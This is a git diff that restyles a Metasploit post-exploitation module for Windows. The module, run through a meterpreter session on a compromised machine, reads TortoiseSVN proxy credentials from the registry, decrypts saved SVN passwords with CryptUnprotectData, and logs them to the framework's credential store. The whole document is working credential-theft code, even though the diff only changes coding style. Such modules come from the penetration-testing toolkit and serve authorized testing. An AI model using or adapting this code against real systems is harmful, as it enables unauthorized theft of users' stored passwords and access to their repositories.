@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,32 +9,28 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather TortoiseSVN Saved Password Extraction',
-        'Description'   => %q{
-          This module extracts and decrypts saved TortoiseSVN passwords.  In
-          order for decryption to be successful this module must be executed
-          under the same privileges as the user which originally encrypted the
-          password.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Justin Cacak'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather TortoiseSVN Saved Password Extraction',
+                      'Description'   => %q(
+                        This module extracts and decrypts saved TortoiseSVN passwords.  In
+                        order for decryption to be successful this module must be executed
+                        under the same privileges as the user which originally encrypted the
+                        password.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'Justin Cacak'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
   end
 
   def prepare_railgun
     rg = session.railgun
-    if (!rg.get_dll('crypt32'))
-      rg.add_dll('crypt32')
-    end
+    rg.add_dll('crypt32') unless rg.get_dll('crypt32')
   end
 
   def decrypt_password(data)
@@ -44,7 +41,7 @@ class MetasploitModule < Msf::Post
     mem = process.memory.allocate(128)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
       ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
@@ -58,22 +55,22 @@ class MetasploitModule < Msf::Post
 
     return "" if len == 0
     decrypted_pw = process.memory.read(addr, len)
-    return decrypted_pw
+    decrypted_pw
   end
 
   def get_proxy_data
     # Check if user proxy setting are utilized
     @key_base = "HKCU\\Software\\TortoiseSVN\\Servers\\global\\"
-    http_proxy_password = registry_getvaldata("#{@key_base}", 'http-proxy-password')
+    http_proxy_password = registry_getvaldata(@key_base.to_s, 'http-proxy-password')
 
-    if http_proxy_password == nil
+    if http_proxy_password.nil?
       return
     else
       # A proxy with password is utilized, gather details
       print_good("HTTP Proxy Settings")
-      http_proxy_username= registry_getvaldata("#{@key_base}", 'http-proxy-username')
-      http_proxy_host = registry_getvaldata("#{@key_base}", 'http-proxy-host')
-      http_proxy_port = registry_getvaldata("#{@key_base}", 'http-proxy-port')
+      http_proxy_username = registry_getvaldata(@key_base.to_s, 'http-proxy-username')
+      http_proxy_host = registry_getvaldata(@key_base.to_s, 'http-proxy-host')
+      http_proxy_port = registry_getvaldata(@key_base.to_s, 'http-proxy-port')
 
       # Output results to screen
       print_status("     Host: #{http_proxy_host}")
@@ -84,11 +81,7 @@ class MetasploitModule < Msf::Post
     end
 
     # Report proxy creds
-    if session.db_record
-      source_id = session.db_record.id
-    else
-      source_id = nil
-    end
+    source_id = (session.db_record&.id)
 
     report_cred(
       ip: ::Rex::Socket.resolv(http_proxy_host), # TODO: Fix up report_host?
@@ -97,7 +90,6 @@ class MetasploitModule < Msf::Post
       user: http_proxy_username,
       password: http_proxy_password
     )
-
   end
 
   def get_config_files
@@ -108,8 +100,8 @@ class MetasploitModule < Msf::Post
 
     begin
       session.fs.dir.foreach(path) do |file_name|
-        next if file_name == "." or file_name == ".."
-        savedpwds = analyze_file(path+file_name)
+        next if (file_name == ".") || (file_name == "..")
+        savedpwds = analyze_file(path + file_name)
       end
     rescue => e
       print_error "Exception raised: #{e.message}"
@@ -117,10 +109,7 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    if savedpwds == 0
-      print_status("No configuration files located")
-    end
-
+    print_status("No configuration files located") if savedpwds == 0
   end
 
   def report_cred(opts)
@@ -134,7 +123,7 @@ class MetasploitModule < Msf::Post
 
     credential_data = {
       module_fullname: fullname,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -144,12 +133,11 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
   end
-
 
   def analyze_file(filename)
     config = client.fs.file.new(filename, 'r')
@@ -166,32 +154,30 @@ class MetasploitModule < Msf::Post
         enc_password = Rex::Text.decode_base64(line)
         password = decrypt_password(enc_password)
       elsif line_num == 12
-        if line.match(/<(.*)>.(.*)/)
+        if line =~ /<(.*)>.(.*)/
           # Parse for output
-          url = $1
-          realm = $2
-          realm.gsub! "\r", ""   #Remove \r (not common)
-          if line.match(/<(.*):\/\/(.*):(.*)>/)
+          url = Regexp.last_match(1)
+          realm = Regexp.last_match(2)
+          realm.delete! "\r" # Remove \r (not common)
+          if line =~ /<(.*):\/\/(.*):(.*)>/
             # Parse for reporting
-            sname = $1
-            host = $2
-            portnum = $3
-            portnum.gsub! "\r", ""   #Remove \r (not common)
+            sname = Regexp.last_match(1)
+            host = Regexp.last_match(2)
+            portnum = Regexp.last_match(3)
+            portnum.delete! "\r" # Remove \r (not common)
           end
         else
           url = "<Unknown/Error>"
         end
       elsif line_num == 16
         user_name = line
-        user_name.gsub! "\r", ""  #Remove \r (not common)
+        user_name.delete! "\r" # Remove \r (not common)
       end
     end
     config.close
 
-    #Handle null values or errors
-    if user_name == nil
-      user_name = "<Unknown/Error>"
-    end
+    # Handle null values or errors
+    user_name = "<Unknown/Error>" if user_name.nil?
 
     # Output results to screen
     print_status("     URL: #{url}")
@@ -201,11 +187,7 @@ class MetasploitModule < Msf::Post
     print_status("")
 
     # Report
-    if session.db_record
-      source_id = session.db_record.id
-    else
-      source_id = nil
-    end
+    source_id = (session.db_record&.id)
 
     report_cred(
       ip: ::Rex::Socket.resolv_to_dotted(host), # XXX: Workaround for unresolved hostnames
@@ -218,7 +200,7 @@ class MetasploitModule < Msf::Post
     vprint_status("Should have reported...")
 
     # Set savedpwds to 1 on return
-    return 1
+    1
   end
 
   def run
@@ -238,5 +220,4 @@ class MetasploitModule < Msf::Post
 
     print_status("Complete")
   end
-
 end
